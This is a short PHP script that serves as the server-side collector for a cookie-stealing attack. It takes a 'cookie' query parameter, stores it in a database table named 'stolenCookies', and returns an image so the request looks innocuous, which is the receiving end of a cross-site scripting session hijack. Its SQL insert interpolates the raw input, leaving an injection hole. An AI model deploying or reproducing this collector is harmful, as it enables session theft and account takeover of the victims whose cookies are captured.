<?php
    require_once "config.php";

    if (isset($_GET["cookie"])) {
    $cookie = $_GET["cookie"];

    $sql = "INSERT INTO stolenCookies (cookie) VALUES ('{$cookie}')";
    pg_query($dbconn, $sql);

    $name = "./cookieMonster.jpeg";
    $fp = fopen($name, 'rb');

    header("Content-Type: image/png");
    header("Content-Length: ". filesize($name));

    fpassthru($fp);
    exit;
    }